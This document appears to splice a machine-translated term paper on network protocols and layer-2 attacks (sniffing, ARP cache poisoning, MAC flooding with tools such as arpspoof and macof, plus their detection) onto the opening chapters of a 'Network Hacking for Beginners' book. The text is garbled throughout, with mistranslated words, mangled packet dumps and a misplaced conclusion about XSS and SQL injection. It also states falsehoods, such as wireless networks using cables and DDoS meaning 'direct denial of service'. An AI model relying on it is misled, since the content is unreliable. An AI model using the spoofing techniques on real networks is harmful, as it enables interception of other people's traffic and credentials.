> ·  Layer 2: CSMA/CD (Ethernet)

The basic idea underlying the Ethernet protocol is constant monitoring of the common send line by all connected subscribers. In order to avoid a collision, data is only transmitted if no other station is transmitting. Due to the finite speed of propagation of signals, however, a collision can occur if two subscribers start transmitting at the same time. If a collision is detected, the stations involved repeating the transmission. The Ethernet protocol is today the quasi-standard for computer networks, but it is also becoming increasingly popular in the field of telecommunications as well as in lighting and sound technology. The most common topologies in the Ethernet protocol are bus systems and star-shaped networks. For modern Ethernet networks, twisted pair cables with eight pairs of twisted and shielded wires are required. Depending on the speed, only two of the four wire pairs are used [Robe05].

> ·  Layer 2: Token Ring

In the token-ring protocol, only one user at a time has the right to send in the form of a virtual token, thereby avoiding collisions. Each participant has a predecessor from whom he receives the token and a successor to whom he passes the token. If data is to be transferred, the participant attaches the data to the token and marks it as " busy." If the token arrives at the receiver, it picks up the data and sends a confirmation to the sender in the same way. The described precursor principle produces a closed ring as topology.

> ·  Layer 3: IP

The Internet Protocol (IP) provides networks with mediation over several stations involved. This allows multiple networks to be connected and packets to be sent between computers that are not connected to a common medium. Version 4 of the Internet Protocol uses 32-bit long IP addresses, usually represented by four decimal coded octets, e.g., 194.25.2.129\. Version 6 of the Internet Protocol, however, uses 128-bit long addresses whose notation the

The MAC addresses are similar, e.g. 2001: 6f8: 915: 0: 230: 1b ff: feb9: 742b. Common to both protocol versions is that in addition to the IP address, a network mask determines whether a target computer can be reached in the local network by splitting the IP address from the left into a network part and a computer part. If a computer cannot be reached locally, a subsequent computer is usually selected, and the packet is forwarded to it. This decision process is called "routing." [Post81b, DeHi98]

> ·  Layer 2: ARP

With the help of the Address Resolution Protocol (ARP), addresses of the Internet protocol (IP addresses) are translated into hardware addresses (also known as Media Access Control or MAC addresses). MAC addresses are 48 bits long and are in hexadecimal form (e.g., 00: 30: 1B: B9: 74: 2B). Each participant in the network stores the mapping of IP addresses to MAC addresses in tabular form in a so-called MAC table. The current MAC table can be viewed on Linux computers with the "arp" command. For example, an entry has the following form:

computer.ea (1 9 2, 1 6 8, 1, 1 4) to 0 0: 3 0: 1 B: B9: 7 4: 2 B [ether] eth0

Here you can see the computer name ( " computer.ea "), the IP address and the corresponding MAC address. In addition, it is saved via which network adapter the computer can be reached (here: "eth0 ").

ARP thus establishes the connection between layers 2 and 3\. This is a very simple, stateless protocol in which only two possible data units exist: “arp-request” and “arp-reply”.

In order to determine the MAC address of the associated subscriber for an IP address (e.g., 192.168.1.14), an arp-request packet is generated and sent to all stations which are connected to the common medium. The station with the searched IP address then takes the sender's MAC address into its own MAC table and sends a packet to the sender that contains both its own MAC and IP address. This allows the sender to correctly address other packets for the same IP address [Plum82].

> ·  Layer 3: ICMP

The Internet Control Message Protocol is used to exchange control information between the communication partners in the network. Among the best-known protocol, data units are "echo-request" and "echo-reply." With an echo-request packet, one participant asks another person for an echo-reply response. This will usually answer, making ICMP the most common review of the accessibility of participants. In addition, one can measure the time that elapses before the response occurs and thus obtain an approximate estimate of the reaction time of the communication partner, the so-called latency. To send and receive such packages, the program ping can be used, which is available on every operating system. [Post81a]

> ·  Layer 4: DNS

The Domain Name System provides methods by which the hostname of a computer (e.g., www.google.com) is translated into its IP address (es). It saves the user the trouble of entering IP addresses in programs such as browsers and has established itself as the standard for this functionality. In addition, if properly configured, DNS servers can be used to "rollback" IP addresses into hostnames, for example, to make log files of a service that is more readable, called "reverse DNS." In a computer network, this service is usually provided by one or more DNS servers [Mock87].

> ·  Layer 4: DHCP

The Dynamic Host Configuration Protocol (DHCP) handles the dynamic and automatic configuration of connected stations. It provides participants with all the information they need to participate in ongoing network communication. This usually includes an IP address, the network mask, the default gateway, and one or more name servers within the network. Possible applications for DHCP are above all the simplified and automatic configuration of computer systems in networks [Drom97].

Fundamental Weaknesses of Hierarchical Communication Models

Hierarchical communication always encapsulates a sharply defined functionality in the next lower layer. A process that uses a service of the next lower tier relies on it to do its job correctly. As a rule, he is unable to see the underlying layers.

If a communication at a certain point is compromised, then data and content, but also control information of higher layers, are also affected. If the content transmitted on the higher layers is not encrypted or otherwise secured against manipulation and unintended insight, reliable communication is no longer possible.

It is thus obvious that the overall system is never safer than the individual subcomponents. An attack on one of the lower levels is a serious threat.

Sniffing

In the context of network security, sniffing refers to the listening of data [Russ02]. It, therefore, represents a passive attack on the security of a network because the attacker usually does not send data to the network. Instead, he will try to gather more information by collecting information and reading secrets that are helpful. These can be credentials such as usernames and passwords, as well as knowledge-based protocols and mechanisms.

Through his passivity, attack by sniffing is very difficult to detect. If the attacker sends data himself to gain access to network traffic, he can betray himself. Also, in some cases, one can try to make a co-healer betray himself.

Snatching as a Protective Measure

Sniffing does not always have the purpose of causing harm, omitting information, or circumventing security mechanisms. Instead, sniffing can help monitor a network and detect malfunctions, attacks, and other disruptions in a good time.

Spoofing

In the context of network and computer security, spoofing refers to the swapping of a foreign identity ([Russ02].) Spoofing can take place at every level of the ISO / OSI communication model. In contrast to sniffer attacks, the compromise of a layer does not automatically prevent the communication that occurs: a fake sender address in an IP packet does not necessarily lead to a wrong sender address of an email.

In this paper, spoofing is only considered as an attack on lower layers and the protocols there such as ARP and IP.

Positive Aspects of Spoofing

As with Sniffing, there are also application spoofing cases that do not affect the security of a system. To the application areas pay, for example:

• Web servers on which so-called VirtualHosts are set up, spoofing the identity of the webserver for whose domain they are delivering data   

• In failover scenarios, the spoofing of a MAC address offers the possibility, in the event of failure of the main computer, of having its services performed by the clients unnoticed by a replacement computer.

Methods and Approaches

The following describes the common infrastructure components, as well as their vulnerabilities, causes, and possible countermeasures. Often, there is no clear distinction between attacking and spoofing attacks; often, both techniques are used simultaneously. This is especially the case when data has to be redirected in order to be able to read it afterward. In addition, by sniffing at information about identities, such as password and usernames, you can also get addresses, which you then accept in a spoofing attack in order to further extend an attack.

Cables and Hubs

If all stations of a network are connected by a cable, then each participant receives all packets. This is also the case when the stations are connected by a central hub. The network adapters of the individual stations know their own MAC address and filter the stream of data packets for those that are addressed to them.

Example

The following is an example output of the ARP traffic that was read on a network interface. You can see two things: The participant with the IP address .1 attempts to determine the MAC address of the nodes with the IP addresses .12 and .222\. Hereby he sends arp-request packages. As can be seen from the time indicated in the left column, the response to such a request is made in a very short time.

13: 37: 43.365944arp who - has192.168.1.222 tell192.168.1.1

13: 37: 43.366207arp reply1 9 2\. 1 6 8\. 1 . 2 2 2 is - at 0 0: 0 b: 8 2: 0 5: 3 f: b7

13: 37: 44.586755arpwho - has192.168.1.12tell192.168.1.1

13: 37: 44.586892arpreply1 9 2\. 1 6 8\. 1 . 1 2 is - at 0 0: 1 1: 2 4: 8 8: 0 2: f 0

A second example is a package from the login process at the FTP server ftp.kernel.org. The left-hand column indicates the position of the data in the data packet, followed by the hexadecimal representation of the data. In the right-hand column, the data is displayed as readable characters, as long as they are each a displayable character. You can see the password that the user has specified.

0x0 0 0 0:00055 d7c e 8 e 5 0 0 3 0 1 bb9 742 b 0 8 0 0 4 5 1 0..] | .., 0., t +. .E.

0x0 0 1 0:004 ea80b 4 0 0 04006451 ac 0 a 8010 ecc 9 8.N. .. @. @ E              .......

0x0 0 2 0:bf 2 5cb 2 100154 c 9 8db79 1 7 4 5 e 8 from 8 0 1 8!.%. ..L. ,              y. E. , , ,

0x0 0 3 0:002 e80 d200000101080 a0 d217 b6d0 cf 9.........., ! { m. ,

0x0 0 4 0:cca 8504153532070617373776 f 7 26440, , PASSPORT . password @

0x0 0 5 0:646 f6 d61696 e2 e 6 36 f 6 d0d0a  domain. com. ,

On multi-user systems, regardless of the transmission technique used, it is possible to monitor the network traffic of the other users, provided that one has the necessary rights to read the data packets from the network card. On Linux systems, only the user root is authorized for this. Unprivileged users receive an error message: “socket: Operation not permitted”.

Wireless Networks

In addition to Ethernet, wireless networks (WLAN) on layer 2 behave as if all the stations involved were connected via a common cable. After all, each participant can receive all data traffic with one antenna. Again, you can use a network card with promiscuous mode switched on to read incoming packets from other participants. Unlike wired networks, wireless networks often use methods to encrypt the transmitted data transparently. An attacker for functioning surveillance must already be part of the encrypted network.

Wiretapping

Another way to get network packets is to literally " tap " any wired network to which you have physical access. This process is called wiretapping or tapping [Grah00]; The device used is called a TAP device.

The simplest conceivable TAP device consists of a network adapter whose receive lines are connected to the transmission lines of the cable that is to be monitored. However, current Ethernet transmitters send a signal at regular intervals to check if the other party is still answering. By the one-sided connection of the cables, such a check fails, and you have to rely on an antiquated card to use with AUI transceiver. Since this method is more of a " hack " than a reliable method of analysis, it is better to buy a professional TAP device. These forward network traffic transparently, but provide the opportunity to send a copy to a connected subscriber. Modern switches also have the ability to replicate all traffic on individual ports for monitoring purposes [3Com].

Advantages of a TAP device

The advantage of such a TAP device is that it works only passively. If you use it to investigate a network for attacks and dysfunctions, it has only a few seizure points due to its passivity and can therefore only be very badly compromised. An attacker cannot obtain information about the existence or state of the system. On the other hand, if an attacker succeeds in installing a TAP device on a network, it is very difficult to trace through network traffic analysis.

Detection Possibilities

Depending on the scope of the attacker's actions, there are no or several ways to track a sniffer on the network. For most of these possibilities, however, there are countermeasures of the attackers, so that it sometimes comes to a kind of Wettrusten between attackers and defenders.

> ·  Name server requests: Current sniffer programs (such as tcpdump) provide the ability to display hostnames instead of IP addresses using reverse DNS functionality, thereby increasing the readability of the output. The high number of DNS queries required for this can be detected on the name server. If you additionally configure a network node with an IP address outside the network address space and if you let it automatically generate network traffic, you can detect a request for its IP address on the name server and conclude that you are using a sniffer program ([ Grah00].

> ·  The latency of the attacker: If a sniffing program is installed on a computer system, this will possibly respond more slowly to requests from the network by analyzing the network traffic and the associated computational effort. By measuring the response time of the connected subscribers from a single computer, e.g., using the IMCP protocol, one can conclude from a correlation of network load and latency of a subscriber to the use of a sniffer program [Russ02].

> ·  Faulty Software: In case of errors in the implementation of drivers and network stacks, you can partially exploit them to see if a host is promiscuous. For example, [Russ02], page 398f, describes the case of an Ethernet driver. In this case, the verification of the MAC address was waived if the card was operated in promiscuous mode. If you send an ICMP echo-request with the IP address of the computer and a MAC address that differs from its own, into the network, the computer replied with an echo-reply, and you could conclude that the network card was operated in promiscuous mode.

Switches

All the problems described above occur because each connected computer can receive all the data in a network, and the filtering of the data is done by the network adapters. This makes it very easy for an attacker to access the data shared by other participants. A way out of this dilemma seems to offer switches. Essentially, they behave like hubs with the difference of knowing which computer is connected to which of their ports. Thus, in addition to arp-request packets, only a packet that is also intended for it is forwarded to a computer. For this purpose, a switch has a table in which each port is stored, which MAC addresses can be reached via this port. A typical example of such a table is 2 13 = 8192 entries for switches with 16 ports, but the size varies between different manufacturers and models.

Cache Poisoning and ARP Spoofing

Assuming the switch works properly, it eliminates the ability to read data that is not sent to one's own address. Therefore it is necessary for an attacker, that all packages, which are to be read, are addressed to himself/herself.

The MAC address of the destination computer for a particular IP address is stored by each subscriber in a local MAC address table. One attack on which the MAC table of a remote computer is deliberately infected with false information is called a cache poisoning attack. To preach to the rest of the network that a foreign IP address can be reached under its own MAC address, there are two possibilities:

> ·  Answering foreign requests: Whenever a computer in the network asks for the destination IP address, the attacker responds with his MAC address. This must happen so quickly that the valid answer of the rightful owner of the IP address is rejected. Due to this condition of a very fast response, such an attack is very difficult to carry out. In addition, the ARP protocol has a vulnerability that does not require timely responses to arp-request packets.

> ·  The vulnerability in the ARP protocol: In order to simplify the administration of networks, it is possible for subscribers to send their MAC address proactively in the network and for all connected computers to update their MAC table. This procedure is called gratious ARP, and it finds application for example in mobile network devices that can thus redirect certain data to a proxy in the old network when moving from one network to another, without interfering with existing connections. An attacker would now miss such a packet, and so his victim would first take the wrong MAC address into their MAC table and then address Ethernet packets to the attacker. This retransmits its MAC address at regular intervals so that the entry in the victim's MAC table is always up-to-date and the victim himself will not make a request to the network. The ARP package used here is a usual arp-reply, which prevents gratious ARP only from stateful packet filters. A detailed description of MOG opportunities and a program to Inspect this provides the program arpspoof from the dsni ff package [Song].

Mac Address Flooding

Another vulnerability of the switches is their finite MAC tables. If a switch does not find an entry in its MAC table for a MAC address, it will transfer the packet to all connected stations. Then he analyzes the answers and learns which port the addressee can reach. If the MAC table of the switch is already full, old entries are overwritten and overwritten by the new entry. An attacker can receive data that is not intended for him if he succeeds and then, override the MAC tables of the switch with incorrect information. He achieves this by sending a large number of packets to the switch, which he himself answers. Due to different sender MAC addresses, the switch's MAC table will eventually be overridden, and valid entries will be overwritten. Thereafter, the switch will also forward packets from other subscribers looking for their MAC address to the attacker. One program that can do this job is macof, which is also in the dsni ff package [song].

Detection Capabilities: ARPwatch and ARP Traffic Analysis

If the attacker attacks both ends of a connection simultaneously, he can reroute all network traffic between the two victims via his own computer. Thus, he can easily listen to and perform special types of continuation attacks.

In addition to the previously described ways to detect such a listener, both the attack and the subsequent redirection of network traffic offer further aspects from which one can identify the attack. Above all, the increased and unusual ARP traffic during the attack phase is analyzed here and serves as an indication of such an attack.

> Conclusion

Thank you for making it through to the end of Hacking For Beginners, let’s hope it was informative and able to provide you with all of the tools you need to achieve your goals whatever they may be.

In summary, web applications can always contain security gaps that are often exploited by hackers. In this term paper, XSS, SQL injection, and phishing were examined in detail as the three hacking techniques. Anyone who has such vulnerabilities in his system must expect that these vulnerabilities are also discovered and exploited in his system.

In most cases, you must make a trade-off between safety and comfort. More safety is often associated with less comfort and vice versa.

Detection During A Seizure

To detect the attack, one can monitor the network for an excessive number of arp-replys. In addition, one can consult the relationship between arp-requests and arp-replys. Should the number of responses exceed those of the requests, an ARP spoofing attack may be possible. See [CaGo03].

If The Attack Was Successful

If the attack was successful, there are essentially two possibilities of detection:

1.  > Monitoring the ARP table: With special software such as arpwatch, you can detect the changes on the MAC table and trigger an alarm.

2.  > Latency monitoring: In addition to the above-described possibility of measuring the reaction time of individual computers from a central point, the simultaneous attack of two computers and the associated diversion of the latency network traffic, and also the transmission time of data packets between the two sacrifices increased. If a participant monitors the response times of his communication partners, he may suspect that the traffic will be redirected via a third computer.

> Networking Hacking

Complete guide tools for computer wireless network technology, connections and communications system.

Practical penetration of a network via services and hardware.

> Introduction

Congratulations on downloading a copy of the Network Hacking for Beginners. I am delighted that you have chosen to learn about network hacking using our handbook. In this handbook, the main focus will be on network hacking. You will get to learn more about different hacking techniques that you can use to access a certain network. A discussion will also ensue about how to find some of the security vulnerabilities as well as how to fix some of the present weaknesses on the network. There are two types of hackers: white-hat hackers and black-hat hackers. White-hat hackers engage in ethical hacking. The main focus of this context will be on ethical hacking. 

Computer and network security are a subject that is quite complex. You should always stay a step ahead to make sure that your network has not been accessed by external attackers illegally. Some of the tools and techniques that can be used to ensure that your network is safe will also be outlined in this context. The best way to make sure that your network is safe is to understand the mindset of an external attacker. 

You can use the knowledge that you have acquired to safeguard your network. Ethical hacking in this context will also focus more on some of the penetration techniques that can be used by a white-hat hacker or a security expert. We will also focus more on vulnerability testing. Some of these tests help you to identify some of the security flaws present in the network. Some of these loopholes can also be sealed to make sure that an external attacker will not access the network and access different types of information that they can use for their gain. At times, you are required not to be very strict on the budget but to look at the impact it will do in your life.

> Chapter 1: The Basics of a Computer Network

Network hacking is termed as the technical effort to always manipulate the behavior of a specific network connection. The people responsible for network hacking are known as hackers. Hacking is termed as constructive and technical work that is not entirely based on the basics of computer systems. Hackers are normally associated with the use of malicious programs that are used to attack different networks over the Internet.

About the Origin of Hacking

The term hacking originated from some engineers who were present at M.I.T. during the 1950s and 1960s. The hackers would even hack the mainframe computers. Other people also went ahead to engage in the act of hacking outside M.I.T. Later, the Internet and computer networking gained some form of popularity and the number of people engaging in hacking activities increased drastically. Most of the people who engage in hacking began taking part in such activities at a young age.

Common Network Hacking Techniques

When carrying out network hacking, people make use of scripts and different network software. The network software is specially-designed, and they are used to manipulate different forms of data that are passing through a specific network. The hackers can obtain some bits of information that allow them to learn more about how the specific system operates. Numerous scripts have also been posted in the Internet, and they can be accessed by anyone. The people who look for the pre-packaged scripts are entry-level hackers. Most of the advanced hackers make an effort to study each of these scripts and they can also modify them as they wish. There are many skilled hackers and they have been hired by commercial firms so that they may protect some of the software within the company so that they cannot be accessed by unauthorized individuals.

Besides hacking, there are other penetration techniques and they include the creation of DoS (denial of service) attacks and worms. Different measures are put in place so that a computer and network cannot be affected by phishing, malware, and Trojans. Most companies hire hackers since they possess more knowledge about hacking and they can deploy the necessary counterattacks.

Hacking Skills

To become a professional hacker, you should possess certain personality traits as well as technical skills as follows:

*   > You must be able to work with numbers. Hacking involves perusing through large amounts of code, data, and various computer algorithms.

*   > You must possess logical reasoning and memory recall since you must assemble small details and facts as a hacker while planning an attack based on logic.

*   > You must be patient. The hacking process is quite complex and you may spend a lot of time trying to come up with an executable plan.

The main reason why networking guidelines are important is that:

*   > Students can learn more about the advantages of networking.

*   > It assists students to utilize the knowledge they possess about networking.

*   > It ensures that students can easily plan for their next stage when it comes to network development.

*   > It provides a standard networking ‘model’ as well as some of the best practices that assist students when carrying out network planning.

The Basics of Networking

A computer network is made up of a collection of computers and other gadgets that have been connected, and they also communicate with each other. The figure below showcases the example of a network and is made up of a local area network that connects the computers to the Internet and various servers.

![](images/00001.jpg)

There are two types of networks and they are as follows;

1.  > Peer-To-Peer Networks: They are normally implemented in areas where there are less than 10 computers, and strict security measures should not be necessarily applied. Each of the computers has the same status and they easily communicate with each other. It is also possible to share different files including spreadsheets and word processing documents can be shared across the entire network. Also, each of the computers on the network shares the same devices which include scanners and printers.

2.  > Client/Server Networks: They are well suited for larger networks. There is a central computer that acts as a ‘server’. It stores all the applications and files being shared on the entire network. The server possesses more capabilities as compared to a normal computer. It can control the network access of the computers that are connected to the network. The normal computers are normally used by the teachers and students in a school whereas the network administrator has access to the entire server.

The Components of a Network

A network is made up of the following components:

*   > At least two computers.

*   > Cables that are used to connect the computers to each other.

*   > Each computer will have a network interface device.

*   > A ‘Switch’ which is used to switch the data from one point to another.

*   > A network operating system software.

Structured Cabling: The most popular cabling techniques include the thin coax and the twisted-pair.

Hubs and Switches: These are devices used to connect a computer to a network. The hub usually directs information around the network and it also facilitates communication between all the connected devices. The switch is classified as a ‘smart hub’. The switches and hubs connect all the devices. When using switches, you can ensure that you have gotten a “dedicated bandwidth” while also operating at full speed. The hub usually shares the bandwidth across different connections and the activities from one PC can lower the Internet connection on the hub.

About Wireless Networks

The term ‘wireless network’ normally refers to many computers that are communicating with each other using a standard network protocol and no cabling present. The computers can also use wireless radio signals while sending information from one network to another.

A Wireless Local Area Network (WLAN)

The network is made up of two primary components and they include a wireless card and an access point. It is possible to transmit information between two computers as long as they are close to each other.

Advantages of a Wireless Local Area Network:

*   > It is easy to add workstations.

*   > It is possible to ensure that the areas where cabling is not possible can access the network.

*   > The installation process is fast and also easy. No cabling through the ceilings and walls is required.

*   > The network can also be accessed from anywhere as long as a person is within the access point.

*   > It comes in handy especially when ensuring that portable networks have access to the network.

*   > It is cheaper to install.

*   > It possesses long term cost benefits.

Disadvantages of a Wireless Local Area Network:

*   > The data transfer rate is always slower depending on the number of computers that have been connected to the network.

*   > Standards change regularly and the wireless cards may also need to be replaced after some time.

*   > Lowering wireless bandwidths will lower the effectiveness of the network.

*   > The security of the network cannot be guaranteed and some configuration must be carried out.

*   > Devices can only operate within a limited distance from a certain access point.

*   > A wired local area network also provides a backbone to the wireless local area network.

*   > In a static environment, it is harder to achieve the long-term cost benefits.

The Components of a Wireless Network

There are numerous components used to configure a wireless local area network. Some of these components are also used when configuring a wired LAN. In both the wireless LAN and wired LAN, network adapter cards are used. The wireless LAN PC card normally contains a built-in antenna. It is then used to connect the computer to a surrounding wireless network. There is a slot where it should be inserted in the computer. It is also possible to connect a desktop computer to a wireless network. In a wireless network, there is the ‘access point’ and it has a similar function to the hub that is present in the wired networks. It normally receives and broadcasts a signal through an adapter card.

The major difference between wireless and wired networks is that in a wireless network, the computers are connected using cables. As for the wireless network, there are no cables needed to formulate a connection between different computers. The network is made up of two primary components and they include a wireless card and an access point. It is possible to transmit information between two computers as long as they are close to each other.

The Configurations of a Wireless Network

A wireless network can be configured using a local area network or a peer-to-peer arrangement. 

Peer-to-peer configuration is termed as the most basic wireless network configuration. It normally relies on the use of wireless network adapters that are installed within the computers and they can easily communicate with each other. For the computers to connect, they should be within then transmitting range. If there are many computers connected, they should be close to each other. As for this type of network configuration, there is no network administration overhead. The configuration is mostly suitable for small installations.

The Benefits of Wireless Configurations

In a wired local area network, people take more time carrying out the cabling. As for the wireless configuration, it possesses the following benefits:

1.  > The amount of work required to install the wireless local area network is minimal.

2.  > The wireless network can also be accessed in areas where it would be difficult to carry out wiring. The network downtime is also minimized.

3.  > When there is a wireless network, it is possible to stay connected to the network all the time regardless of the location of the equipment.

4.  > The wireless network operates over in a spherical manner.

5.  > It is possible to share documents over a wireless network.

Additional Advantages of a Wireless Network:

1.  > Speed: The network is quite convenient when it comes to sharing different files over the network. When a network is not available, documents can only be transferred from one point to another using flash disks and other physical mediums. When using physical mediums to transfer documents, the process is quite time consuming.

2.  > Cost: There are numerous software programs and they are cost-effective.

3.  > Centralized Software Management: When installing a network, it is possible to install the software on the file server and it can be used by all the computers that are connected in the network, meaning that the wireless network helps to save on time.

4.  > Resource Sharing: It is possible to share resources on a network whereby numerous computers are connected.

5.  > Flexible Access: People can access different files on any computer that has been connected to the specific network.

6.  > Security: The files and programs on the network can be safeguarded using the “copy inhibit” feature. Passwords can also be used to safeguard different documents.

The main challenges encountered when installing a network include:

1.  > Costs: Although a wireless network is supposed to be cost-effective; however, the initial investment is costly since you will also have to hire a technician.

2.  > Administrative time is required: A network should be maintained properly. A network administrator should be hired to handle such issues.

3.  > File server may fail: A file server is quite susceptible in different ways. When the file server fails, the whole network cannot operate. Different files and programs may be lost in the process.

About CISCO

CISCO is a company that offers networking for the Internet. The company has been operational since 1984\. The network was also established by two scientists who were studying at Stanford University. The networking solutions offered by CISCO are being utilized by different service providers as well as numerous small and medium enterprises. The networking solutions offered by the company normally connect computing devices, people, and computer networks. People can now connect with others while also sharing different pieces of information. A large percent of Internet traffic has also been traveling across the CISCO systems. The company has also been using the Internet to run its own business online from managing inventories to product orders. When using the Internet, CISCO can also keep track of the travel and staff expenses. When exploring different possibilities that can be beneficial to your business, you should opt for the CISCO systems since the company has a better understanding of how you can get your business online. By taking advantage of the experience and knowledge that CISCO possesses, you can enhance the progressive growth of your business.

> Chapter 2: Introduction Into Hacking

There are different types of hacking techniques and hacker categories. In this book, the main focus will be on ethical hacking. We will also look into network hacking to be precise. Some of the methods used to test the computers and their network for any security issues will also be discussed. All these vulnerabilities are going to be outlined since hackers use some of these loopholes to gain access to a network. As for ethical hacking, it mainly involves utilizing some of the professionally proven security techniques that are used to ensure that a network is secure. The tests are carried out by IT professionals and they perform such duties after receiving authorization from the owner of the network system.

Different Terminologies Used in Hacking:

Hackers: These are people who try to compromise sensitive information that they have also obtained illegally. Some of the hackers usually target the systems that they deem well-protected since they want to elevate their status within their circles.

Malicious Internal Users: They are also referred to as internal attackers. They normally try to compromise sensitive information since they can easily access it within the organization.

Ethical Hackers: They are the good guys. They can hack into a system and ensure that they have notified the user about the present vulnerabilities. The owner of the network can then take the necessary measures to ensure that the computer systems and sensitive information cannot be accessed by malicious individuals.

The term hacker can be defined in two ways. Traditionally, this term showcases that such individuals like to tamper with different electronic and software systems, and they also like to look into how a computer operates. At the moment, a hacker is a person who breaks into a system maliciously for their gain; these individuals usually gain access to critical forms of information and they use it to take advantage of other people.

Types of Hackers

1.  > Black-Hat Hackers: The hackers who usually harbor ulterior motives.

2.  > White-Hat Hackers: They are the good guys and they usually carry out ethical hacking.

The Mindset of a Hacker

You need to assess how secure your system is so that you may get a better picture of what you are up against. Most of the vendors who deal with security products always offer advisory services on how people should protect their networks and computer systems from malicious users who may exist both internally and externally. The best way to understand how to protect your system is by looking into the mindset of a hacker. Some of the challenges that people face as a result of hackers will also be outlined in this context. It is also good to look into what motivates a hacker.

Many hackers have been saying that the public normally fails to understand them, and there is some truth in that statement. It is easy to judge but quite hard to understand reality. The main issue is that most of the stereotypes surrounding hackers have been formed as a result of people being misinformed about reality. Hackers are also classified in different ways depending on their abilities as well as what motivates them to engage in such acts. Some hackers are very skilled, and they are always in the pursuit of knowledge. At the end of the day, it is evident that each hacker is after their gain. It is also good to note that there are both negative and positive aspects when it comes to hacking.

Throughout history, hackers have always been on the pursuit of different forms of knowledge. They also enjoy the thrill of each challenge that comes their way. Some of the people who aspire to be hackers have limited skills, though. On the other hand, hackers have also proven to be innovative and they like the adventure. They always look for new ways that they can use to exploit different networks and computer systems. They always look into some of the areas that people overlook. In some instances, they also ask themselves some questions revolving around what would happen if they carried out certain activities including changing some codes within the installed programs. Some hackers also assume that they can carry out some improvements on the mechanical and electronic devices that are currently being used.

Various forms of evidence also showcase that hackers can hack for different gains. For instance, they may have some political motives. Other companies may also hire them to get rid of the competition. In some instances, they hack into different networks for their financial gain. Some of the malicious acts have proven to affect many individuals negatively. It is also good to note that some of these hackers do not care about what happens to the individuals who are behind the firewall that is supposed to ensure that the network is safe. They always carry out attacks since they will gain a lot in the process.

Some of the negative issues that arise from these attacks include jeopardizing the jobs of certain individuals who are in charge of securing the systems. In some instances, there is a high chance that some people within the company may be targeting various forms of information and they intend to use it for their gain. Such individuals are known as internal hackers. They normally root the files on different servers while also sharing every piece of information that they have managed to access. At times, they also delete sensitive pieces of information. It is hard to identify some of these individuals who harbor malicious motives. In some instances, they may also influence some of the employees within an organization negatively. 

Some of the malicious users have a criminal background. It is advisable to perform certain checks when hiring people. Their past behaviors may influence them in different ways and they may compromise the integrity of your organization. Although a person may have a clean record, it does not mean that they cannot engage in criminal activities. Every criminal always starts from somewhere. Although hacking is quite bad, such people usually play a key role in the advancement of technology. When hackers managed to penetrate a network, security experts usually work towards ensuring that they have devised different measures they can use to secure the network.

If the world did not have hackers, there is a high chance that people would care less about the presence of various tools that can prevent data leakage and tool scanning. Such a world would not be bad in any way; the main issue is that the technology would not be advanced. Technology has ensured that people have access to different employment opportunities and the field also progresses gradually.

Although many technical security solutions have been formulated from time to time, it is not possible to bring an end to hacking because some of these hackers are always one step ahead. There are always people who will always be in the lookout trying to bring down different computer systems and networks. Such goals can be achieved through the formation of viruses in the form of worms and Trojans. The mentioned viruses have different effects on networks and computer systems. People are supposed to take the necessary measures so that their networks and systems are well-protected.

Hackers who usually break into networks and computer systems have been present for many decades. The hacking activities became prevalent after the Internet became widespread during the 1990s. The mainstream media has also been talking more about hacking. There are many hackers; however, there are only a few who are widely known for their prowess when it comes to penetrating different networks. In most instances, hackers usually use aliases so that their real identities cannot be known by the public.

Since there are many black-hat and white-hat hackers, it is easy to describe a typical hacker. In most cases, they are antisocial individuals who have a lot of time to themselves. Each hacker also has a unique set of skills and they use different methods to achieve their end goal. The hackers can be classified into the following categories depending on their skillset:

Script Kiddies: They are normally computer novices and they take advantage of different hacking tools, documentations, and vulnerability scanners. Some of these tools are available on the Internet free of charge. They also do no possess any knowledge of the occurrences that take place behind the scenes. Although they are not well-versed with knowledge about hacking, they possess enough knowledge to cause a headache; however, they are quite sloppy and they do not know how to cover their tracks after taking part in different malicious acts. They can be tracked using their digital footprints.

Criminal Hackers: These are hackers who possess a lot of knowledge and skills and they also come up with their hacking tools. They formulate different programs and scripts that are also used by ethical hackers and script kiddies. In most instances, they normally come up with viruses in the form of worms and other types of malware. They can easily access any system and they also know how to cover up their tracks. They never leave any digital footprints behind. They can make it look like a certain individual hacked into the network or computer system. Advanced hackers are very secretive. Before they share any information with other people, they must be deemed worthy to have access to such information. Some hackers are not well-ranked; however, for them to be worthy, they must have access to some unique bits of information that they can use to prove themselves to the high-profile hackers. These hackers are the worst enemies when it comes to information security. Although they may be deemed as professionals, they are not so different from the script kiddies.

Security Researchers: These are IT professionals who are also publicly known. They normally keep track of the activities on a computer system, networks, and different applications. Their main focus is on the vulnerabilities that may be present. They come up with different tools and scripts that they can use to exploit some of these vulnerabilities. If such experts were not in existence, there would be fewer security tools that can be accessed as open source. Some of the security researchers always post their findings on blogs and other media platforms. When you follow up on the content that they usually come up with, you can learn more about the present vulnerabilities that can affect your network or computer system.

What matters most is the skill level of the hacker. Also, the source of their motivation equally matters.

Hacktivists: They always try to spread social and political messages through their hacking activities. Their main focus is on raising public awareness about specific issues. At times, hackers may be focusing on raising awareness of the importance of legalizing marijuana and other major issues in the current world, and they may also launch DDoS (direct denial of service) attacks with specific reasons. 

Cyberterrorists: They normally attack the government or any other public entities and hack into their computer systems and networks with different motives. For instance, they may be targeting the power grid or other areas. They also steal classified government information which is also used to their advantage. Some nations take the threats from cyberterrorists very seriously, and that is why they make use of different security protocols that can ensure that the government systems cannot be acceded by hackers. 

Hackers for Hire: These hackers always take part in organized crime. Some of these hackers form organizations and always work together to carry out different attacks that may be targeting the government and other institutions. The population of hackers for hire is not as large. In most cases, most hackers prefer accessing different networks for fun while also seeking to expound on the knowledge that they possess. Sometimes, the greatest threat to an organization may be within the building and they may have a valid network account. As a result, they will not struggle as much to gain access to the network.

What Motivates Hackers

In most cases, they hack because they can. Hacking is more of a hobby for some people. Some of them look into different ways through which they can break into a system and some of the impossible scenarios that are present as they try to access a certain system. Although there are many types of hackers, the main focus in this context is on the hackers who try to access computer systems and networks.

Most of them benefit a lot when they outsmart the government and other prominent institutions. They usually make headlines since they are engaging in illegal acts. When they gain access to the network of an entity that has some valuable and sensitive information, they always feel better about themselves. Most of the hackers normally feed off from the gratification that they get when they access a computer network; they become obsessed eventually. The adrenaline rush that they experience motivates them to hack into other systems. Hackers also gain a lot from the thrill they experience when penetrating a complex computer network.

Hackers normally promote individualism. The information they possess is easily shared since they believe that information should be free and everyone can access it. They also assume that the cyberattacks are also different from the physical attacks in the real world. The hackers may also misunderstand their victims in some instances. Additionally, they may not be conversant with the consequences that arise during the hacking process.

